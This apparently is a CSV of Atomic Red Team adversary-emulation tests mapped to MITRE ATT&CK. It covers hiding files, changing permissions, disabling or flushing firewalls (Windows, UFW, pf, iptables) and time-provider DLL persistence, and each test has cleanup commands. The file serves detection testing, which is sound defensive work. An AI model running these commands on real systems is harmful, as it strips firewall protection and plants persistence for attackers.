",,,
T1564.001,Hide Artifacts: Hidden Files and Directories,Hide Files Through Registry,f650456b-bd49-4bc1-ae9d-271b5b9581e7,"Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.
See how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx 
",windows,,,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowSuperHidden /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /f >nul 2>&1
",,,
T1564.001,Hide Artifacts: Hidden Files and Directories,Create Windows Hidden File with powershell,7f66d539-4fbe-4cfa-9a56-4a2bf660c58a,"Creates a file and marks it as hidden through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file
and observe that the Attributes is ""H"" Hidden.
",windows,,,"$file = Get-Item $env:temp\T1564.001-9.txt -Force
$file.attributes='Hidden'
",powershell,True,,"cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'
",command_prompt,"dependencies.0.description: The file must exist on disk at specified location (#{file_to_modify})

dependencies.0.prereq_command: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: echo system_Attrib_T1564.001-9 >> #{file_to_modify}

","input_arguments.file_to_modify.description: File to modify

input_arguments.file_to_modify.type: string

input_arguments.file_to_modify.default: %temp%\T1564.001-9.txt

"
T1564.001,Hide Artifacts: Hidden Files and Directories,Create Windows System File with powershell,d380c318-0b34-45cb-9dad-828c11891e43,"Creates a file and marks it as System through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file
and observe that the Attributes is ""S"" System.
",windows,,,"$file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'
",powershell,True,,"cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'
",command_prompt,"dependencies.0.description: The file must exist on disk at specified location (#{file_to_modify})

dependencies.0.prereq_command: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: echo system_Attrib_T1564.001-10 >> #{file_to_modify}

","input_arguments.file_to_modify.description: File to modify

input_arguments.file_to_modify.type: string

input_arguments.file_to_modify.default: %temp%\T1564.001-10.txt

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (numeric mode),34ca1464-de9d-40c6-8c77-690adf36a135,"Changes a file or folder's permissions using chmod and a specified numeric mode.
",linux,macos,,"chmod #{numeric_mode} #{file_or_folder}
",sh,,,,,,"input_arguments.numeric_mode.description: Specified numeric mode value

input_arguments.numeric_mode.type: integer

input_arguments.numeric_mode.default: 755

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (symbolic mode),fc9d6695-d022-4a80-91b1-381f5c35aff3,"Changes a file or folder's permissions using chmod and a specified symbolic mode.
",linux,macos,,"chmod #{symbolic_mode} #{file_or_folder}
",sh,,,,,,"input_arguments.symbolic_mode.description: Specified symbolic mode value

input_arguments.symbolic_mode.type: string

input_arguments.symbolic_mode.default: a+w

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (numeric mode) recursively,ea79f937-4a4d-4348-ace6-9916aec453a4,"Changes a file or folder's permissions recursively using chmod and a specified numeric mode.
",linux,macos,,"chmod -R #{numeric_mode} #{file_or_folder}
",sh,,,,,,"input_arguments.numeric_mode.description: Specified numeric mode value

input_arguments.numeric_mode.type: integer

input_arguments.numeric_mode.default: 755

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (symbolic mode) recursively,0451125c-b5f6-488f-993b-5a32b09f7d8f,"Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.
",linux,macos,,"chmod -R #{symbolic_mode} #{file_or_folder}
",bash,,,,,,"input_arguments.symbolic_mode.description: Specified symbolic mode value

input_arguments.symbolic_mode.type: string

input_arguments.symbolic_mode.default: a+w

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chown - Change file or folder ownership and group,d169e71b-85f9-44ec-8343-27093ff3dfc0,"Changes a file or folder's ownership and group information using chown.
",macos,linux,,"chown #{owner}:#{group} #{file_or_folder}
",bash,,,,,,"input_arguments.owner.description: Username of desired owner

input_arguments.owner.type: string

input_arguments.owner.default: root

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml

input_arguments.group.description: Group name of desired group

input_arguments.group.type: string

input_arguments.group.default: root

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chown - Change file or folder ownership and group recursively,b78598be-ff39-448f-a463-adbf2a5b7848,"Changes a file or folder's ownership and group information recursively using chown.
",macos,linux,,"chown -R #{owner}:#{group} #{file_or_folder}
",bash,,,,,,"input_arguments.owner.description: Username of desired owner

input_arguments.owner.type: string

input_arguments.owner.default: root

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

input_arguments.group.description: Group name of desired group

input_arguments.group.type: string

input_arguments.group.default: root

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chown - Change file or folder mode ownership only,967ba79d-f184-4e0e-8d09-6362b3162e99,"Changes a file or folder's ownership only using chown.
",linux,macos,,"chown #{owner} #{file_or_folder}
",sh,,,,,,"input_arguments.owner.description: Username of desired owner

input_arguments.owner.type: string

input_arguments.owner.default: root

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chown - Change file or folder ownership recursively,3b015515-b3d8-44e9-b8cd-6fa84faf30b2,"Changes a file or folder's ownership only recursively using chown.
",macos,linux,,"chown -R #{owner} #{file_or_folder}
",bash,,,,,,"input_arguments.owner.description: Username of desired owner

input_arguments.owner.type: string

input_arguments.owner.default: root

input_arguments.file_or_folder.description: Path of the file or folder

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chattr - Remove immutable file attribute,e7469fe2-ad41-4382-8965-99b94dd3c13f,"Remove's a file's `immutable` attribute using `chattr`.
This technique was used by the threat actor Rocke during the compromise of Linux web servers.
",macos,linux,,"chattr -i #{file_to_modify}
",sh,,,,,,"input_arguments.file_to_modify.description: Path of the file

input_arguments.file_to_modify.type: path

input_arguments.file_to_modify.default: /var/spool/cron/root

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chflags - Remove immutable file attribute,60eee3ea-2ebd-453b-a666-c52ce08d2709,"Remove's a file's `immutable` attribute using `chflags`.
This technique was used by the threat actor Rocke during the compromise of Linux web servers.
",linux,,,"touch #{file_to_modify}
chflags simmutable #{file_to_modify}
chflags nosimmutable #{file_to_modify}
",sh,,,,,,"input_arguments.file_to_modify.description: Path of the file

input_arguments.file_to_modify.type: path

input_arguments.file_to_modify.default: /tmp/T1222.002.txt

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chmod through c script,973631cf-6680-4ffa-a053-045e1b6b67ab,"chmods a file using a c script
",macos,linux,,"#{compiled_file} /tmp/ T1222002
",sh,,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}

dependencies.0.prereq_command: gcc #{source_file} -o #{compiled_file}

dependencies.0.get_prereq_command: gcc #{source_file} -o #{compiled_file}

","input_arguments.source_file.description: Path of c source file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder/T1222.002/src/T1222.002.c

input_arguments.compiled_file.description: Path of compiled file

input_arguments.compiled_file.type: path

input_arguments.compiled_file.default: /tmp/T1222002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chmod through c script (freebsd),da40b5fe-3098-4b3b-a410-ff177e49ee2e,"chmods a file using a c script
",linux,,,"#{compiled_file} /tmp/ T1222002
",sh,,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}

dependencies.0.prereq_command: cc #{source_file} -o #{compiled_file}

dependencies.0.get_prereq_command: cc #{source_file} -o #{compiled_file}

","input_arguments.source_file.description: Path of c source file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder/T1222.002/src/T1222.002.c

input_arguments.compiled_file.description: Path of compiled file

input_arguments.compiled_file.type: path

input_arguments.compiled_file.default: /tmp/T1222002

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chown through c script,18592ba1-5f88-4e3c-abc8-ab1c6042e389,"chowns a file to root using a c script
",macos,linux,,"sudo #{compiled_file} #{source_file}
",sh,True,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}

dependencies.0.prereq_command: gcc #{source_file} -o #{compiled_file}

dependencies.0.get_prereq_command: gcc #{source_file} -o #{compiled_file}

","input_arguments.source_file.description: Path of c source file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder/T1222.002/src/chown.c

input_arguments.compiled_file.description: Path of compiled file

input_arguments.compiled_file.type: path

input_arguments.compiled_file.default: /tmp/T1222002own

"
T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chown through c script (freebsd),eb577a19-b730-4918-9b03-c5edcf51dc4e,"chowns a file to root using a c script
",linux,,,"#{compiled_file} #{source_file}
",sh,True,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}

dependencies.0.prereq_command: cc #{source_file} -o #{compiled_file}

dependencies.0.get_prereq_command: cc #{source_file} -o #{compiled_file}

","input_arguments.source_file.description: Path of c source file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder/T1222.002/src/chown.c

input_arguments.compiled_file.description: Path of compiled file

input_arguments.compiled_file.type: path

input_arguments.compiled_file.default: /tmp/T1222002own

"
T1562.004,Impair Defenses: Disable or Modify System Firewall,Disable Microsoft Defender Firewall,88d05800-a5e4-407e-9b53-ece4174f197f,"Disables the Microsoft Defender Firewall for the current profile.
Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...
",windows,,,"netsh advfirewall set currentprofile state off
",command_prompt,,,"netsh advfirewall set currentprofile state on >nul 2>&1
",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,Disable Microsoft Defender Firewall via Registry,afedc8c4-038c-4d82-b3e5-623a95f8a612,"Disables the Microsoft Defender Firewall for the public profile via registry
Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f
",command_prompt,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 1 /f
",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,Allow SMB and RDP on Microsoft Defender Firewall,d9841bf8-f161-4c73-81e9-fd773a5ff8c1,"Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.
Caution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...
",windows,,,"netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes
netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes
",command_prompt,,,"netsh advfirewall reset >nul 2>&1
",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,Opening ports for proxy - HARDRAIN,15e57006-79dd-46df-9bf9-31bc24fb5a80,"This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.

reference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf
",windows,,,"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450 
",command_prompt,True,,"netsh advfirewall firewall delete rule name=""atomic testing"" protocol=TCP localport=450 >nul 2>&1",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,Open a local port through Windows Firewall to any profile,9636dd6e-7599-40d2-8eee-ac16434f35ed,This test will attempt to open a local port defined by input arguments to any profile,windows,,,"netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any",powershell,True,,"netsh advfirewall firewall delete rule name=""Open Port to Any"" | Out-Null",,,"input_arguments.local_port.description: This is the local port you wish to test opening

input_arguments.local_port.type: integer

input_arguments.local_port.default: 3389

"
T1562.004,Impair Defenses: Disable or Modify System Firewall,Allow Executable Through Firewall Located in Non-Standard Location,6f5822d2-d38d-4f48-9bfc-916607ff6b8c,This test will attempt to allow an executable through the system firewall located in the Users directory,windows,,,"Copy-Item ""#{exe_file_path}"" -Destination ""C:\Users\$env:UserName"" -Force
netsh advfirewall firewall add rule name=""Atomic Test"" dir=in action=allow program=""C:\Users\$env:UserName\AtomicTest.exe"" enable=yes
",powershell,True,,"netsh advfirewall firewall delete rule name=""Atomic Test"" | Out-Null
Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
",,,"input_arguments.exe_file_path.description: path to exe file

input_arguments.exe_file_path.type: path

input_arguments.exe_file_path.default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe

"
T1562.004,Impair Defenses: Disable or Modify System Firewall,Stop/Start UFW firewall,fe135572-edcd-49a2-afe6-1d39521c5a9a,"Stop the Uncomplicated Firewall (UFW) if installed.
",linux,,,"ufw disable
",sh,True,,"ufw enable
ufw status verbose
",sh,"dependencies.0.description: Check if ufw is installed on the machine.

dependencies.0.prereq_command: if [ ! -x ""$(command -v ufw)"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi
if echo ""$(ufw status)"" |grep -q ""inactive""; then echo -e ""\n***** ufw inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Stop/Start Packet Filter,0ca82ed1-0a94-4774-9a9a-a2c83a8022b7,"Stop the Packet Filter if installed.
",linux,,,"service pf stop
service pf disable
",sh,True,,"service pf enable
service pf start
service pf status
",sh,"dependencies.0.description: Check if pfctl is installed on the machine.

dependencies.0.prereq_command: if [ ! -x ""$(command -v pfctl)"" ]; then echo -e ""\n***** PF NOT installed *****\n""; exit 1; fi
if [ ""$(kldstat -n pf)"" = """" ]; then echo -e ""\n***** PF inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Stop/Start UFW firewall systemctl,9fd99609-1854-4f3c-b47b-97d9a5972bd1,"Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. 
",linux,,,"systemctl stop ufw
",sh,True,,"systemctl start ufw
systemctl status ufw
",sh,"dependencies.0.description: Check if systemctl and ufw is installed on the machine.

dependencies.0.prereq_command: if [ ! -x ""$(command -v systemctl)"" ]; then echo -e ""\n***** systemctl NOT installed *****\n""; exit 1; fi
if [ ! -x ""$(command -v ufw)"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi
if echo ""$(ufw status)"" |grep -q ""inactive""; then echo -e ""\n***** ufw inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Turn off UFW logging,8a95b832-2c2a-494d-9cb0-dc9dd97c8bad,"Turn off the Uncomplicated Firewall (UFW) logging. 
",linux,,,"ufw logging off
",sh,True,,"ufw logging low
ufw status verbose
",sh,"dependencies.0.description: Check if ufw is installed on the machine and enabled.

dependencies.0.prereq_command: if [ ! -x ""$(command -v ufw)"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi
if echo ""$(ufw status)"" |grep -q ""inactive""; then echo -e ""\n***** ufw inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Add and delete UFW firewall rules,b2563a4e-c4b8-429c-8d47-d5bcb227ba7a,"Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. 
",linux,,,"ufw prepend deny from 1.2.3.4
ufw status numbered
",sh,True,,"{ echo y; echo response; } | ufw delete 1
ufw status numbered
",sh,"dependencies.0.description: Check if ufw is installed on the machine and enabled.

dependencies.0.prereq_command: if [ ! -x ""$(command -v ufw)"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi
if echo ""$(ufw status)"" |grep -q ""inactive""; then echo -e ""\n***** ufw inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Add and delete Packet Filter rules,8b23cae1-66c1-41c5-b79d-e095b6098b5b,"Add and delete a rule on the Packet Filter (PF) if installed and enabled. 
",linux,,,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -
pfctl -a pf-rules -s rules
",sh,True,,"pfctl -a pf-rules -F rules
sed -i """" '/anchor pf-rules/d'
pfctl -f /etc/pf.conf
",sh,"dependencies.0.description: Check if pf is installed on the machine and enabled.

dependencies.0.prereq_command: if [ ! -x ""$(command -v pfctl)"" ]; then echo -e ""\n***** PF NOT installed *****\n""; exit 1; fi
if [ ""$(kldstat -n pf)"" = """" ]; then echo -e ""\n***** PF inactive *****\n""; exit 1; fi 

dependencies.0.get_prereq_command: echo ""anchor pf-rules >> /etc/pf.conf""
pfctl -f /etc/pf.conf

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Edit UFW firewall user.rules file,beaf815a-c883-4194-97e9-fdbbb2bbdd7c,"Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.
",linux,,,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules
grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules
",sh,True,,"sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules
",sh,"dependencies.0.description: Check if /etc/ufw/user.rules exists.

dependencies.0.prereq_command: if [ ! -f ""/etc/ufw/user.rules"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Edit UFW firewall ufw.conf file,c1d8c4eb-88da-4927-ae97-c7c25893803b,"Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf 
which controls if the firewall starts on boot and its logging level.
",linux,,,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf
grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf
",sh,True,,"sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf
cat /etc/ufw/ufw.conf
",sh,"dependencies.0.description: Check if /etc/ufw/ufw.conf exists.

dependencies.0.prereq_command: if [ ! -f ""/etc/ufw/ufw.conf"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Edit UFW firewall sysctl.conf file,c4ae0701-88d3-4cd8-8bce-4801ed9f97e4,"Edit the Uncomplicated Firewall (UFW) configuration file for setting network 
variables /etc/ufw/sysctl.conf.
",linux,,,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf
grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf
",sh,True,,"sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf
cat /etc/ufw/sysctl.conf
",sh,"dependencies.0.description: Check if /etc/ufw/sysctl.conf exists.

dependencies.0.prereq_command: if [ ! -f ""/etc/ufw/sysctl.conf"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Edit UFW firewall main configuration file,7b697ece-8270-46b5-bbc7-6b9e27081831,"Edit the Uncomplicated Firewall (UFW) main configuration file for setting 
default policies /etc/default/ufw.
",linux,,,"echo ""# THIS IS A COMMENT"" >> /etc/default/ufw
grep ""# THIS IS A COMMENT"" /etc/default/ufw
",sh,True,,"sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw
",sh,"dependencies.0.description: Check if /etc/default/ufw exists.

dependencies.0.prereq_command: if [ ! -f ""/etc/default/ufw"" ]; then echo -e ""\n***** ufw NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Tail the UFW firewall log file,419cca0c-fa52-4572-b0d7-bc7c6f388a27,"Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file 
/var/log/ufw.log.
",linux,,,"tail /var/log/ufw.log
",sh,True,,,sh,"dependencies.0.description: Check if /var/log/ufw.log exists.

dependencies.0.prereq_command: if [ ! -f ""/var/log/ufw.log"" ]; then echo -e ""\n***** ufw NOT logging *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Disable iptables,7784c64e-ed0b-4b65-bf63-c86db229fd56,"Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) 
Attackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables 
rules, which in fact ""disable"" iptables. 
",linux,,,"iptables-save > /tmp/iptables.rules
iptables -F
",sh,True,,"iptables-restore < /tmp/iptables.rules
",sh,"dependencies.0.description: Check if iptables is installed on the machine.

dependencies.0.prereq_command: if [ ! -x ""$(command -v iptables)"" ]; then echo -e ""\n***** iptables NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,Modify/delete iptables firewall rules,899a7fb5-d197-4951-8614-f19ac4a73ad4,"Instead of completely ""disabling"" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.
By doing so, they may cause less noise to avoid detection. 
",linux,,,"iptables-save > /tmp/iptables.rules
iptables -D OUTPUT -p tcp --dport 21 -j DROP
",sh,True,,"iptables-restore < /tmp/iptables.rules
",sh,"dependencies.0.description: Check if iptables is installed on the machine.

dependencies.0.prereq_command: if [ ! -x ""$(command -v iptables)"" ]; then echo -e ""\n***** iptables NOT installed *****\n""; exit 1; fi
if ! echo ""$(iptables -L)"" | grep -q ""DROP .*dpt:ftp""; then echo -e ""\n***** this firewall rule is NOT activated *****\n***** activate it by executing \""iptables -A OUTPUT -p tcp --dport 21 -j DROP\"" *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1562.004,Impair Defenses: Disable or Modify System Firewall,LockBit Black - Unusual Windows firewall registry modification -cmd,a4651931-ebbb-4cde-9363-ddf3d66214cb,"An adversary tries to modify the windows firewall registry
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /f >nul 2>&1
",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,LockBit Black - Unusual Windows firewall registry modification -Powershell,80b453d1-eec5-4144-bf08-613a6c3ffe12,"An adversary tries to modify the windows firewall registry.
",windows,,,"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
",powershell,True,,"Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile""  -Name EnableFirewall -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -Force -ErrorAction Ignore
",,,
T1562.004,Impair Defenses: Disable or Modify System Firewall,Blackbit - Disable Windows Firewall using netsh firewall,91f348e6-3760-4997-a93b-2ceee7f254ee,"An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     
",windows,,,"netsh firewall set opmode mode=disable
",command_prompt,True,,"netsh firewall set opmode mode=enable >nul 2>&1
",,,
T1547.003,Time Providers,Create a new time provider,df1efab7-bc6d-4b88-8be9-91f55ae017aa,"Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
The new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
in C:\Users\Public\ as validation that the test is successful.

Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/
",windows,,,"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time
",powershell,True,,"net stop w32time
reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /f
rm -force C:\Users\Public\AtomicTest.dll
net start w32time
",,,
T1547.003,Time Providers,Edit an existing time provider,29e0afca-8d1d-471a-8d34-25512fc48315,"Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
The time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
in C:\Users\Public\ as validation that the test is successful.

Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/
",windows,,,"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time
",powershell,True,,"net stop w32time
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Windows\SYSTEM32\w32time.DLL"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""0"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""0"" /f
rm -force C:\Users\Public\AtomicTest.dll
net start w32time
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on Windows,d29f01ea-ac72-4efc-8a15-bea64b77fabf,"Copies and deletes mail data on Windows
